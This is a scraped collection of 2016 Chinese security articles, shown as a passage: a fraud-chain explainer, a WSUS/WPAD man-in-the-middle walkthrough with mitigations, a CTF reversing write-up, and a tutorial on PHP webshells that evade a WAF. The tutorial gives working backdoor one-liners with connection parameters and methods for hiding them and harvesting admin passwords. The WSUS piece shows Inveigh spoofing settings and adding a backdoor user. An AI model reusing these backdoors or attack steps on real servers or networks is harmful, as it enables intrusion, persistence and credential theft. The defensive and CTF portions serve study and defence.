近。欢迎本文的主人公王小明，一个机票代理公司的小白领，要用他的经历跟大家分享这些黑色产业链的故事。支付盗刷( 一 )盗刷端王小明昨天发工资了，好开心，准备下班之后边吃火锅边唱歌，突然，收到一连串消费短信：您的尾号为xxxx的xx银行卡在XX易购消费5999元，当前余额0.89元。正在吃着撒尿牛丸的王小明一脸懵逼，看看自己的银行卡还在自己干瘪的钱包里，王小明已经预感到未来一个月这顿火锅会是他最好的一顿饭了。这样的案例屡见不鲜，且从有银行卡的历史开始就开始有盗刷。对于电商网站而言，对此也苦不堪言，因为品牌形象受损、资产损失赔付。但是王小明的卡到底是怎么被干掉了呢。（1）卡号、身份证信息、手机号的泄露等等，excuse me？这个也叫泄露，难道这个不都是算是公开的了么，银行内部人员泄露、社工库、定制化数据脱取、公共场合不安全刷卡方式泄密等等，是不是有人还收到送pos机给你的情况？哦，对了，还有爱占便宜的刷卡送米送油的活动是可以的哦~（2） 验证码窃取一张图，不多说，诸多技术手段老实说我也不是很了解，但是只想说，短信验证码绝对不安全。其实很多时候验证码泄露并没有想象的那么难，就跟我文章刚开始说的一样，业务风险方向的很多黑产是基于最简单的流程漏洞和人的心理，利用社会工程学很有可能就捞到验证码信息。这里举一个曾经非常有名的利用社会工程学窃取G行网银用户验证码的案例：G行网银里的余额转移到贵金属账户里面是不需要短信验证码的，黑产利用盗窃到的账户密码（不要问我怎么盗取到的，有多少人一条密码走天下？）将余额转到贵金属账户，然后伪装G行客服给客人电话说他的账户涉及xx操作，客人去登录自己的G行账户确实发现余额变少了（账户余额看不到贵金属的金额），当时就急了呀，这时客服又适时的来电话说我帮你操作可以把余额转回来，需要你提供下发到你手机上的验证码，其实这个时候收到的验证码可能就是转账或者消费的验证码了，但是这个时候客户心理着急啊，哪想得到那么多，收到验证码之后就给骗子报过去了，于是，贵金属账户里面的余额就真的拜拜了。这一起案例到底有多少G行客户收到影响、金额是多少至今我没有拿到有效数据，但是从我与G行人员的接触来看，这批案件已经惊动到了G行总行高层，所以金额不会少。让我们继续说说王小明，上个月王小明家里没油的时候小区门口有个xxx送温暖进小区的活动，刷卡9.9送一桶油，但是活动主办方说为了保证活动用户真实性，需要每个人带着自己身份证登记刷卡的卡号、手机号、身份证号，王小明作为一个单纯宝宝深信不疑，并从内心表示深深的感恩xx品牌；双11晚上，作为单身狗的王小明寂寞难耐，打开了手机某个小H网的地址排解心中的寂寥，于是，基于以上种种，王小明这个月只能吃土了。( 二 ) 销赃端俗话说，祸兮福所倚，吃土的王小明总算不再走背运了，被盗刷的第二天，王小明的同事李小花听闻了王小明的悲催故事，萌生出一丝怜悯之意，考虑自己已经失恋33天了，王小花决定答应了追求了自己32天的王小明，王小明终于不再是单身狗了。经过134个小时的相处，两个人觉得需要更深层次的了解彼此，于是准备在一个夜黑风高之夜把最珍贵的交给对方。因为这个时候的王小明已经在吃土了，300块钱一晚的R家对于王小明来说已经非常奢侈了。这个时候一个好哥们张大飞知道了王小明的窘况，把王小明拉到一个“全国酒店机票内部低价折扣群”，群主知道的王晓明的需求之后，爽快的答应王小明先预定成功再付款，不得不说王小明背运终于过了，给了群主200块钱就收到X程的预定短信入住了高端大气的R家酒店，在一个夜黑风高夜与李小花同学好好的了解了彼此。王小明对群主感恩戴德。可是王小明不知道，上次自己的卡无缘无故被盗刷也是拜这个群主所赐。作为盗卡团伙的小喽啰，群主仅仅是作为整个盗刷链条的最下面一环进行销赃，无论是借记卡或者贷记卡，收集完信息之后都会卖给下家的，具体能卖多少钱就要看借记卡的余额或者贷记卡的额度了，总之，这条产业链已经非常成熟，每一个环节都有一拨人在做这件事，对于这，我只想说，老司机带带我。图四：盗卡/伪卡交易产业链电商业务作弊/流程漏洞产业链其实电商环节中的可作弊的点太多，刷点评、刷排名、刷销量这些都已经老生常谈，TB对这块也构建了十分详细的风控规则，比如用户浏览行为、跳转前后页面、收货地址、支付流水等进行规则性监控。这里想说另外一个也很常见的产业链，俗称薅羊毛。每次我跟别人说我的工作内容之一是“薅羊毛”的时候，人家都会说你的工作性质好可爱哦~~求我的心理阴影面积。我们来继续开始王小明的故事。王小明与李小花恩爱到了情人节，正在吃土的王小明想要送给李小花一份礼物，但是电商网站上的东西都挺不菲的，王小明一筹莫展。这个时候，王小明的好哥们张大飞又出现了，给他指了TB这个道，so~就这样，王小明同学又好开森~图五：网上大量优惠券售卖示意至于优惠券、新手礼包被刷对于电商网站来说已经是足够正常，至于是否该重视这件事，则看公司老板的态度，是不是要把这些营销费用用到最真实的客户那里。当然，提到这条薅羊毛产业链，还得从一开始的源头说起。（一）注册领券端说到注册领券，简直是风控圈人人憎恶的问题，比盗刷还可恨，因为这是一条合法的黑色产业，不出事还好，出事了只能怨自己风控措施做的不严，不过这样的也能带来虚假的繁荣。一套成熟的黑产肯定都会有猫池插大量的银行卡，刷单稍微低级点的黑产团伙拥有几千上万张卡，再比如就是：图六：黑产团伙拥有大量黑卡当我看到700万张卡被打击的时候，我的内心是拔凉拔凉的，警方你要是都打击完了我是不是以后也要失业了？当然，高级点的黑产团伙才不会用这些，人家用的都是真实手机号，还会交月租的哟，20块钱的月租薅羊毛收入绰绰有余，电话拨过去人家还会跟你周旋哟~~哦，对了，肯定会有人会问关于验证码的问题，在这只能说连12306都不是事，还有什么~~至于该如何防范，以前我们使用过国内某第三方公司x安的号码识别服务，从对空号等的识别效果来看还是能够应用在生产业务当中的。图七：验证码打码网站（二）销赃端至于销赃端，不多说渠道太多，小打小闹的卖给个人那就算了，其实对于电商企业而言，最怕的就是黑产联合供应商刷单套利，而面对这种套利行为对于电商企业而言最大的问题是该如何给其定性，因为无论怎么样稍有用心的供应商都会让这条证据链无从查起。图八：可刷的网站优惠券信息共享群我们的主人公王小明同学在一家机票代理公司工作，所谓机票代理公司就是帮别人下机票订单的。王小明同学是一名普通的操作员，公司老板每天都会给王小明1000个新注册的x哪儿 x程的账号，每个账号里面都有好几十的机票优惠券，王小明每天都使用这些优惠券给客人下单。他一直很好奇老板从哪里搞来的这么多账号，直到他把心中的疑问跟张大飞说了，张大飞深谙此道，告诉了王小明同学其中端倪。王小明同学心中一阵窃喜，回去准备干一番自己的大事业，当然王小明不准备干机票了，王小明跟张大飞合伙开了一家酒店，采用同样的方法，事业蒸蒸日上，跟李小花的日子也过的风生水起。当然，这些黄牛号可不单单只是用来享受优惠券，还可以用来参加网站的抽奖活动、刷点评、电商的秒杀活动等，用处大着呢。（三）供应商商户端账户泄露/虚假供应商（1）商户端信息泄露王小明的酒店在各大OTA上面都挂牌了，除了使用虚假账号代客下单把前台转化的客人在OTA下单套取红包补贴之外，作为一名上进青年王小明还是很希望自己的酒店在OTA上能够有一番作为的，至少希望可以把自己的酒店可以在商圈搜索的时候暴露在首页，这个时候，张大飞又介绍了一个哥们给王小明说可以帮忙刷销量，但是呢需要王小明提供各大OTA的商户端账号密码。确实，在接下来的一个月里酒店销量风生水起，但是到结算佣金的时候，王小明一脸懵逼，产生了大量的现付结算佣金，但是这些间夜在自己酒店从来没有住过。突然想到那个刷单的哥们，结果发现失去联系，现付订单里的返现也全部被套空。现在带有O2O性质的企业都有自己的商户端，而对于商户而言对密码的重视程度不高，因此会有很多黑产团伙利用诸多手段套取商户手里的密码，当然如何获取到的途径是有多方面的，可能采用一些技术手段，但是就如我前文提的那样，绝大多数的黑产团伙都是采用比较低级的手段，比如会有专人去酒店应聘前台服务人员，所以，很多黑产业务都是非常低技术门槛的，就跟前文说的一样钻的就是整个公司的流程管理漏洞。（2）虚假供应商王小明不甘心，一定要发誓把在OTA上损失的钱给追回来。我们的王小明同学是很机智的。结合到自己被骗的场景以及发现在某个OTA上的酒店上线门槛很低，王小明偷偷的使用诸多虚假证件做了一家虚假酒店提交给OTA申请挂牌，很快就被通知挂牌通过，该酒店订单目前能够享受约8%的现付订单返现~王小明同学不甘示弱，每天都要在这家虚假酒店上下数十万的订单套取几千元的补贴，等到要结算佣金的时候，关机再也找不到人，王小明同学一阵开心。可是不巧的是，该OTA的风控部门事后分析能力还是挺强的，通过诸多路径还是找到了王小明同学作案的事实。对于供应商的审核也是很多O2O和电商行业的漏洞，一个虚假供应商能做的事情很多，除了套用平台发放的优惠券之外，还有一个非常重要的套现的作用，我们以王小明的视角来继续开始我们的故事。电商信贷欺诈登录（一）信用额度套现王小明的酒店投入了大量的资金，现在手头开始吃紧了，几张信用卡已经被刷爆了，现在手头已经开始急需用现金了，王小明一筹莫展。紧急时候，一定要推荐这位张大飞同学，张大飞给王小明一个qq号，qq签名是蚂蚁花呗、苏宁任性付、京东白条套现。在这个qq主人的教导下，王小明顺利开通了这三个网站的信用额度，并且顺利的从这三个网站购物套现了2万元，只是王小明需要付出10-20%的套现手续费。图九：信用额度套现广告对于有信用支付的电商网站而言，这种类型的信用套现危害暂时体现不出来，可能过了几个月的时候开始出现坏账，美团点评曾经紧急关停过花呗支付渠道。而在短期KPI考核的压力下，电商公司会很欢迎这些套现的行为，因为这会提升信用产品的用户使用频率。但是不置可否，这些需要套现的用户其还款能力是很值得质疑的。而一家店铺使用大量的信用支付，对这家店的真实性也应该表示质疑。所以这就是刚刚说的一家虚假供应商能够做很多事情。对于电商行业，我想他们的风控体系大概都对每家店铺的信用交易情况进行了监控，我相信黑市上这么多套现渠道肯定是基于大量的虚假电商店铺；另外，作为心机biao的风控er去埋伏套现群也是精确打击虚假店铺的的有效方法之一。 （二）身份冒用欺诈王小明跟李小花要去买房了，好不容易看上一套三室一厅90平，等到去办房贷的时候征信报告打出来一脸懵逼，为什么会有信贷逾期坏账记录？王小明去人行咨询获得自己逾期信息来源于一家上报征信记录的消费金融公司，再去跟消费金融掰扯终于搞清了自己有过一笔网上信用贷款，王小明打死不认，但是各种信息都是他的身份认证信息，王小明二脸懵逼。在各种掰扯之下，消金公司终于答应王小明从PBOC里面撤销逾期记录。图十：身份证信息泄露渠道目前形形色色的电商公司都有自己的消费金融公司，也有很多需要上报人行征信，在网上申请额度的过程也特别简单，因此欺诈风险成为网上信贷机构不可估量的损失，对于网贷来说欺诈风险远远大于常见的信用风险。而为了用户体验，申请额度所需要的材料其实非常简单，因此网上有诸多利用很多虚假材料来获得信用额度并用来购物、提现的案例，具体过程与操作手法暂不详表，只能说，这是一条基本没办法抓到的暴利的黑色产业链。总结限于篇幅以及一些黑产操作流程，所以很多细节没有阐述特别清晰。另外，业务环节的风险远远比这篇文章里面的东西要多，而且各家互联网公司随着自身业务的多样性和特异性，会衍生出新的风险，所以公司与公司之间的风控体系在业务层面还是有较大的差异。而对于互联网行业来说，对于这种高频次的用户非面对面的行为，面临黑产的肆虐是不可避免的，这也是攻防不断提升的过程，需要在业务运营过程中不断预知风险、发现风险、提高风险门槛，所以说风控体系的形成也是随着业务量的提升、风险事件的案例来不断优化完善的。黑灰产的利润很诱人，但是这条产业链毕竟是游走在法律边缘，在过去的工作中，也参与了数起案件协同网警、刑警抓获在公司运营中的黑灰产犯罪团伙并得到了有期徒刑的法律制裁。因此，君子爱财取之有道，各位珍重。","2016-11-22 13:43:39","网络安全","互联网业务安全的黑灰产业链的故事 - 【途牛风控】","http://nsoad.com/Article/Network-security/20161122/833.html"
"5ccbfa1c4f2f0a0a7a69c016","过狗相关的资料网上也是有很多，所以在我接下来的文章中，可能观点或者举例可能会与网上部分雷同，或者表述不够全面。","kong","先知技术社区独家发表本文，如需要转载，请先联系先知技术社区授权；未经授权请勿转载。写在前面：过狗相关的资料网上也是有很多，所以在我接下来的文章中，可能观点或者举例可能会与网上部分雷同，或者表述不够全面。但是我只能说，我所传达给大家的信息，是我目前所掌握或者了解的，不能保证所有人都会有收获，但是个人水平有限，可能您觉得文章水平过低，或者并无太大营养。但是跳出文章本身，无论何种技术，重在交流，分享与总结。另外，希望年轻人不要有太多戾气，更多的是需要保持一个谦逊态度对待技术，尤其是这个浮躁的安全界。以上是我的开场白（没办法，这是我的一贯风格）写php后门连载的目的。希望大家能够暂缓日站的脚步，静下心来想一想，我们在用菜刀做一些除(sang)暴(jin)安(tian)良(liang)的事的时候，php做了些什么，安全狗又蜷缩在门后目睹了些什么。其实我更愿意传授安全之道，而非渗透之术。参考过网上很多种已有的php后门的写法，总之思路各种奇葩与新奇，但是衡量一个优秀的php后门并不是单单的看代码多少，过狗怎么样，而是一种基于实际场景的一a种变通，所以，php后门这是一门艺术。连接后门时发生了什么所以当我在菜刀中双击连接的时候到底发生了什么，安全狗又是如何发现后门并拦截的？php后门原理很简单，当我们连接时，实际上我们会向php文件post数据，这个数据的内容为我们需要php去执行的代码，当php获取到数据并执行后，将返回一个response。那么waf能够识别到什么层次？其实waf最多获取到tcp数据，也就是说，可以获取到我们所post的数据，与服务器所返回的数据，至于php执行命令的过程，用了什么对象，走了什么函数，大部分waf是无法得知的，只能检测敏感字符的提交与返回，与特征查杀。所以即使是eavl()这个最原始的函数php如何去执行，waf是不管的，但是实际情况你可能还没到那一步，后门就被和谐了。因为在此之前waf肯定要对后门文件进行特征分析，这关过了，才到数据层，最后才到返回层，那么接下来第二章与第三章将从后门构造与数据提交角度来探讨过狗的方式。由于waf软件众多，防护机制不尽相同，我的一系列文章全部以安全狗为例。## WAF如何查杀首先，后门写入的方式有很多，比如程序本身的move函数，远程包含，数据库导出等等方式，在这里就不详细展开了，在后门写入过程中，waf首先会对文件的格式进行一个黑白名单检测，如一律不允许php文件上传。如果上传这一步可以过，那么接下来就是对上传的文件内容进行被动查杀。而后门特征的查杀一般在后门上传的过程与访问的过程，waf会使用相关的正则与代码预编译来判断是否为危险代码。以前还经常有用字符串叠加或者加注释来躲避字符串匹配，但是现在很难单纯靠这种方式来绕过了。当我们的代码本身可以过狗，加工post数据后门执行也没有问题后，最后就是WAF对返回的敏感信息进行检测与过滤了。除此之外WAF可能会对特殊上传的文件进行权限控制，例如无法执行某些命令等等。理论篇其实本身并没有太多的东西可说，更多的是希望大家对于WAF有个初步的认识，不要盲(qiang)目(xing)过狗，滥用菜刀。那么下面两篇文章会分别从后门构造篇与数据传输篇来阐述过狗的来龙去脉。其实狗狗还是很可耐的额。##后门构造思路，与安全狗文件特征检测的机制。另外强调一下，这篇文章需要大家对于php有一定的认识。本章节分为三大部分，第一部分针对初级，分析菜刀php代码的执行过程，较基础；第二部分主要总结一些可以利用的后门姿势，这部分我主要给大家分享一些搜集的后门，希望可以拓展大家的思路；第三部分主要分享后门隐藏之道。声明：在后门举例中大部分后门构造与思路，可能网上都有类似的，如有雷同，来打我呀！目前主流的waf软件（如安全狗）一般对于后门文件有主动查杀与被动查杀，主动好理解，被动主要就在于你访问该文件的时候，对该文件就行查杀，比如链接菜刀的时候。因为安全狗对后门的查杀其实就是对代码的一个预编译，去除注释等无用代码，遇到if，直接检查if内部内容。安全狗获取其他各种waf有什么样的特征库，我们并不能全部知晓，我们能做的只有一点点尝试，WAF永远在更新，黑阔门永远在换套路，几乎没有一劳永逸的后门。说明：如果想更好的过狗，那么php是必须要会的，为了尽量照顾到不会php的同学，本文分享一些猥琐思路弥补一下。先来一个最简单的过狗后门下面分享的几个一句话都是可以直接过狗的，虽然很简单，但此之前，我们来遛一遛狗。这句话已经可以执行一切命令了，但是必然被杀，我们可以用extract函数简单的处理下请求的数据当然，想要完美过狗，执行更多命令，还需要数据层加工，详情参考第三章。经典的回调函数很多时候并不是给变量多一层加密就安全，其实很多waf对base64_decode相当敏感。例如：@array_map(base64_decode($_REQUEST['xx']),(array)base64_decode($_REQUEST['sofia']));原理分析：xx参数直接传入一个assert函数，sofia参数传入assert(eval('执行代码'))。直接暴出array_map后门，试试去掉base64？没错，就这么简单，最危险的地方就是最安全的地方，起码文件特征安全狗确实没有检测出来。然而这个一句话D盾是四级的，因为稍微懂点的人都能看出来是个后门。但是距离实际意义上的过狗还是远远不够的，还需要数据层加工，详情参考第三章。之后你会发现，就这个一句话修改下post数据，可以完整过狗。不卖关子：@array_map(assert,(array)base64_decode($_REQUEST['sofia']));连接方法：test.php?sofia=YXNzZXJ0KCRfUkVRVUVTVFsndnVsbiddKQ==    密码 ：vuln再来一个回调后门<!--?$Base = ""base6"".""4"".""_decod"".""e"";$_clasc = $Base($_REQUEST['vuln']);$arr = array($Base($_POST['sofia']) =--> '|.*|e',);@array_walk($arr, $_clasc, '');?&gt;这是我之前修改过的一个版本，这里用的其实还是preg_replace后门，也是通过回调函数来实现执行，同样可以过：详解：带入参数：vuln=cHJlZ19yZXBsYWNl(preg_replace)sofia=cGhwaW5mbygp(phpinfo())<!--?$Base = ""base6"".""4"".""_decod"".""e"";$_clasc = $Base($_REQUEST['vuln']);//$_clasc=preg_replace$arr = array($Base($_POST['sofia']) =--> '|.*|e',); //$arr = array('phpinfo()' =&gt; '|.*|e')@array_walk($arr, $_clasc, ''); //preg_replace('|.*|e',phpinfo(),'')?&gt;网上有很多现成的回调函数或者其他方式来过特征检测，再这里就不重复造轮子了。##后门隐藏权限维持也是渗透中重要的环节，隐藏的不到位第二天就掉权限，猥琐的后门能一辈子跟随。### 方法一：远程读取或者include文件这个方法比较常见，如：<!--?phpif($_POST['token'] == 'sofia'){require 'home/wwwlogs/access.log';}但是就个人而言，我一眼看上就觉得有鬼，哪个正常程序会鬼畜到包含一个日志文件或者图片，当然也要根据场景来定。### 方法二：将代码放到核心函数文件中，做好文件时间修改，只要查杀不出来，一般站长也不会去动核心文件，也是具有一定隐蔽性的，### 方法三：创建类或者函数，分离后门代码这样的话基本上很难查杀了，比如再global_function.php类的文件中创建一个类，或者函数，在所调用这个核心函数的相关文件中实例化一个类，调用函数，那么也是妥妥执行的。如：把class放到核心类文件中，在相关的调用文件中放入执行代码，隐蔽性会加强很多。<!--?phpclass Parse_Args {public function apply_filters($key) {assert($key);}}//执行代码@extract($_REQUEST);$reflectionMethod = new Parse_Args();$reflectionMethod ---> apply_filters($s0fia);?&gt;### 方法四：直接加密代码直接将后门文件加密，其实这就只是eval($_POST[x])加密后的结果，还需要构造什么？但是在渗透过程中可用性并不是很高，很多时候要写入后门代码，这根本没法写的，只能作为一种维持手段。### 方法五：创建手工后门php不仅可以获取get，post数据还是可以获取server数据的，如user-agent，referrer，cookie，client ip，所以我们完全可以在这些参数中加入需要执行的代码，但需要注意的是有的参数日志中会记录，这里仅提供思路，大家根据实际情况取发挥。### 方法五：间接维持后台权限可以直接在后台登陆页所include的核心函数中加入获取用户名密码的代码，如直接生成到本地服务器的一个txt中（可以加密下），记住这个隐蔽的url，时不时就会有密码记录，或者远程post密码到自己的服务器上。可以在后台页面中插入一个xss，这种效率相对较低，但是也是一种思路。### 方法六：来硬的这种方法只能针对中小站长，找到一个网站的核心但是又不常用的文件，比如lang文件等等，将自己后门加入，然后将整个文件加密，再替换源文件，功能一切正常，站长对这类文件不会起太大疑心。这个思路也可以结合方法三。### 方法七：php.ini后门修改php.ini配置来达到每个页面都执行某个后门，每个php都是后门，比如可以配置auto_prepend_file，自动加载某个文件，这部分后期抽时间再单独写出来。php一句话后门过狗姿势万千之传输层加工【二】【本文转自先知技术社区  作者：sofia  网络攻防小组编辑整理发布】","2016-11-29 19:12:32","Web安全","php一句话后门过狗姿势万千之后门构造与隐藏（一）","http://nsoad.com/Article/web/20161129/869.html"
"5ccbfa1c4f2f0a0a7a69c017","先看一个例子本地测试环境：PHP 5.4.45 + Win<?php    $command = &#39;dir &#39;.$_POST[&#39;dir&#39;];    $escaped_command = escapeshellcmd($command);    var_dump(","kong","前言本文介绍了wpad攻击与wsus攻击的原理，并结合已有的工具进行攻击演示。WPAD 攻击Web代理自动发现（WPAD）是Microsoft Windows客户端用于自动配置本地代理设置的协议.协议允许用户客户端（例如IE）自动定位和使用适当的代理设置以访问企业网络出口。 协议使用过程如下：1. DHCP时是否获得去了代理配置2. 如果没有，解析“wpad.domain.com”，并从该服务器获取配置。3. 如果我们没有得到结果，使用NetBIOS（NBT-NS）广播来解析名称“WPAD”4. 如果找到服务器，请从该服务器请求具有uri“/wpad.dat（http：// &lt;SERVER&gt; /wpad.dat）”的资源，其中将包含代理的设置由于在NBT-NS回复（步骤3）期间缺乏验证，客户请求的广播域或本地子网中的任何其他客户端都可以响应并声称自己是WPAD服务器。然后恶意的WPAD服务器可以提供一个恶意的配置文件来配置目标的代理设置，且可以拦截所有客户流量进行篡改。WSUS 中间人攻击Windows Server Update Services（WSUS）是一种允许企业集中管理和部署更新补丁或修补程序的系统。 在Blackhat USA 2015，来自Context的一组安全研究人员Paul Stone（@pdjstone）和Alex Chapman介绍了企业在不加密网络上进行更新的问题。 他们明确指出，没有SSL，任何人都可以对WSUS进行中间人攻击，以提供恶意的更新包。 顺便说一下，HTTP是WSUS的默认值。 另外一个问题：更新文件必须有Microsoft签名。 解决方案是： PsExec.exe具有微软签名，可以用来执行任意Windows命令。结合攻击对于本节，我假设我们已从外部获得对加入域的主机的初始访问。1.  Identify the Possibilities第一步是识别任何WSUS错误配置。我们可以通过查询注册表来确定系统的WSUS设置。我们可以查询Internet Explorer的当前代理配置，如果WSUS的URL是“HTTP：// &lt;SERVER&gt;”，并且浏览器设置为自动配置代理，则我们可以继续！可能的注册表键值：HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\WUServerHKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU\UseWUServerHKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\DefaultConnectionSettings注意：如果第5个字节是偶数，则Internet Explorer中设置了wpad代理WSUS SettingsAutomatic Settings Selected (5th byte)我们可以使用ARP找到我们要定位的子网上的另一个主机2. Network Bending Kung-fu我们使用Cobalt Strike’s Beacon功能进行反向端口转发。在WPAD投毒中，我们可以将受害者的浏览器指向我们的“代理”，这是目标网络到我们的C2服务器的反向隧道。然后，使用SOCKS转发，将浏览流量推送回环境中，以接收除了篡改包之外的WSUS操作更新。3. Poison首先，配置我的恶意载荷和启动WSUSpectProxy。WSUSpectProxy接收其payload.ini文件中定义的自定义内容（示例如下所示）。 像研究人员在他们的白皮书推荐的一样，我使用PsExec.exe利用参数启动powershell.exe运行“net user”和“net localgroup”添加一个后门用户“bob”。（WSUSpectProxy项 目：https://github.com/ctxis/wsuspect-proxy）其次启动Invoke-Inveigh，有以下参数设置：-IP &lt;IP OF POISON VICTIM&gt; : Set the IP to bind the raw socket to-NBNS Y : Set NBNS spoofing to be enabled-LLMNR Y : Set LLMNR spoofing to be enabled-HTTP Y : Turn on the HTTP server for serving up WPAD.dat files-SMB N : Do not do any sort of SMB relay kind of stuff-StatusOutput Y : Print status outputs-Tool 2 : Configure the settings to run this in a certain tool. The Empire setting works well for Cobalt Strike-SpooferIPsReply &lt;TARGET IP&gt; : IP of the target or CSV list of targets-WPADAuth Anonymous : Do not pop a creds box for the WPAD-WPADIp &lt;ProxyHost&gt; : IP of poison host where the rportfwd command is run-WPADPort 8080 : port of the rportfwd command此命令将执行对目标的WPDA投毒，并提供一个WPAD.dat，指向目标浏览器，该端口将转发回我们的C2服务器的8080端口。4. MITM Updates一旦满足MITM条件，目标的更新请求就被拦截，我的恶意数据包就会被传递给客户端。 由于是关键更新，因此会被执行，添加一个本地用户。现在我们可以访问并且可以使用新添加的用户部署Beacon代理。修复这个攻击的成功包含了很多的缺陷，他们必须在网络中被修复，但是我还是看到很多对这个攻击链过程中的很多错误的配置与控制。除了进行控制以防止漏洞外，有很多方法，像SOC和CIRT可以在网络中与复杂的攻击者中检测出恶意活动，前提是检测是可信的。Wpad控制/修复要修复WPAD配置错误，应在内部DNS服务器中添加名称为“wpad”的DNS A或CNAME记录，以防止主机进入执行MDNS / LLMNR广播的步骤。 此外，如果不需要该功能，可以通过GPO取消选中自动设置功能。https://technet.microsoft.com/en-us/library/cc995062.aspxhttp://tektab.com/2012/09/26/setting-up-web-proxy-autodiscovery-protocol-wpad-using-dns/WSUS修复任何更新软件包或软件都应始终通过安全连接（至少为SSL）进行部署。有很多项目如后门软件和应用程序都在网络中传输。很多人利用这种技术获得初始访问和横向渗透。对于WSUS后门，这个网站有助于你进行正确的配置： https://technet.microsoft.com/en-us/library/hh852346.aspx#bkmk_3.5.ConfigSSL检测预防控制是一个最低限度的检测，随着组织架构的成长，审计能力是必须的。PowerShell v5PowerShell v4和v5引入了许多值得欣赏的功能。在这里特别提到他们，因为我在我的攻击链中使用了Inveigh.ps1，但是与底层技术的检测不直接相关，只有“武器化矢量”。PowerShell攻击频率正在上升，任何正在改进网络检测的人都应该寻找并引入一定的措施来应对PowerShell攻击。事件日志尽管在大型网络中，日志的存储转发很困难，但从监测和收集这些日志所获得的价值来说我认为是完全值得的。在这种攻击链的情况下，似乎最好的日志记录是添加集合是c:\ windows \ windowsupdate.log文件。“WindowsUpdateClient”源和17或19的系统事件日志将显示已下载/安装的更新的名称。在这种情况下，DNS日志的记录也将非常有用。假设组织怀疑被wpad投毒，在没有控制的情况下将新工作站引入环境，或者当前工作站被禁用，则他们将告警。WMI事件描述我们的团队是一个对WMI的进攻和防守巨大的支持者。 你可能已经看到了马特•格雷伯最近的twitter，如这里，他提供WMI签名，将提供周围值得监测的警报事件。 ATD的Hunt能力主管Jared Atkinson开发了一个名为Uproot的工具，它实际上是一个使用WMI Event Subscription的无代理IDS主机。在我们这个例子下，我们可以创建WMI事件过滤器：“HKEY_USERS \ &lt;USER-GUID&gt; \ Software \ Microsoft \ Windows \ CurrentVersion \ Internet Settings \ Wpad”下的网络配置文件。此外，你可以在创建或修改wpad.dat文件时，获取临时删除的 &lt;USER APP DATA&gt; \ Local \ Microsoft \ Windows \ Temporary Internet Files \ Content.IE5 \”文件。结论虽然我没有在这篇文章中介绍任何新工具，我的目标是拼凑几个不错的工具，以展示一个有趣的攻击链和鼓励创造性的技术。 此外，我希望能够阐明我在大型企业环境中仍然常见的几种错误配置。","2016-11-15 21:15:07","Web安全","Windows更新服务-WSUS中间人劫持","http://nsoad.com/Article/web/20161115/782.html"
"5ccbfa1c4f2f0a0a7a69c018","uit Du Hack是法国最大的年度黑客聚会。这个活动面向所有的安全技术爱好者：不论你是有丰富经验的安全研究人员，还是一个刚刚入门的新手。","FlappyPig","竞赛官网：https://quals.nuitduhack.com/ Matriochka step 1主要逻辑在这里：非常简单，字符串倒序然后和一个字符串比较，直接讲T开头字符串倒序就是flag。step2用了个int 3产生sigtrap信号，在信号处理函数中进行+1或者-1操作。from zio import *value = [0x0FF6FEAFE,0x0CDAF4DB6,0x8D9A9B17,0x83A147A7,0x7AD24DCA,0x0C99CA1B9,0x71CEAC15,0x932C2931]flag = 'W'key = 0xdeadbeeffor v in value:    c = v^key    key = v    flag += l32(c)flag2 = 'W'for i in range(len(flag)-1):    if ord(flag[i])&amp;1:        flag2 += chr((ord(flag[i])+ord(flag[i+1]))&amp;0xff)    else:        flag2 += chr((ord(flag[i+1])-ord(flag[i])+0x100)&amp;0xff)print flag2step3进行了类似base64运算。不过每次运算用的字符串表在动态改变。import base64import osfrom zio import *f = open('./step3.bin', 'rb')d = f.read()[0x16e3:].split('\x00')[0]f.close()base_table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'def spec_base64(d, s):    dict = {}    for i in range(64):        dict[s[i]]= base_table[i]    dict['='] = '='    d2 = ''    for j in range(len(d)):        d2 += dict[d[j]]    return base64.b64decode(d2)v = 0x1457893def get_index():    global v    v = ((v * 0x539) &amp; 0xffffffff) % 0x7FFFFFFF    return v&amp;0x3fs0 = []for i in range(64):    s0.append(base_table[i])ss = []for i in range(16):    for j in range(50):        index1 = get_index()        index2 = get_index()        tmp = s0[index1]        s0[index1] = s0[index2]        s0[index2] = tmp    ss.append(''.join(s for s in s0))print len(ss)for i in range(16):    d = spec_base64(d, ss[15-i])    print dkey2 = 'platypus'flag = ''for i in range(len(d)):    flag += chr(ord(d[i])^ord(key2[i%8]))key1 = 'pony'flag2 = ''for i in range(len(flag)):    flag2 += chr(ord(flag[i])^ord(key1[i%4]))print flag2os.popen('./step3.bin JonSn0wIsDead!AndDealWithIt! 2&gt;step4_2.bin')step4层层异或解密代码，写了个idapython脚本自动化还原。from idaapi import *from idc import *from idautils import *def decrypt(start, end, xor_data):    for i in range(start, end):        a = get_byte(i)        patch_byte(i, a^xor_data)def xor_dec(ea, is_patch):    MakeCode(ea)    count = 0    count2 = 0    start1 = None    end1 = None    start2 = None    end2 = None    key = None    for i in range(0x200):        if (Byte(ea) == 0x48) &amp; (Byte(ea+1) == 0x8d) &amp; (Byte(ea+2) == 0x05): #lea rax            MakeCode(ea)            if count == 0:                start1 = GetOperandValue(ea, 1)            elif count == 1:                end1 = GetOperandValue(ea, 1)            elif count == 4:                start2 = GetOperandValue(ea, 1)            elif count == 5:                end2 = GetOperandValue(ea, 1)                break            count += 1        if (Byte(ea) == 0x83) &amp; (Byte(ea+1) == 0xf0): #xor            MakeCode(ea)            if count2 == 0:                key = GetOperandValue(ea, 1)&amp;0xff            count2 += 1        ea += 1    if start1 is None:        return None    if end1 is None:        return None    if start2 is None:        return None    if end2 is None:        return None    if key is None:        return None    print hex(start1), hex(end1), hex(start2), hex(end2), hex(key)    if is_patch:        #decrypt(start1, end1, key)        decrypt(start2, end2, key)    return start2def find_header(ea):    for i in range(0x200):        if Byte(ea) == 0xe9: #jmp            if (Byte(ea-2) == 0x74) &amp; (Byte(ea-1) == 0x05):                MakeCode(ea)                PatchByte(ea-1, 0x90)                PatchByte(ea-2, 0x90)                print hex(ea)                return GetOperandValue(ea, 0)            if (Byte(ea-2) == 0x90) &amp; (Byte(ea-1) == 0x90):                MakeCode(ea)                PatchByte(ea-1, 0x90)                PatchByte(ea-2, 0x90)                print hex(ea)                return GetOperandValue(ea, 0)        if Byte(ea) == 0xeb: #jmp            if (Byte(ea-2) == 0x74) &amp; (Byte(ea-1) == 0x02):                MakeCode(ea)                PatchByte(ea-1, 0x90)                PatchByte(ea-2, 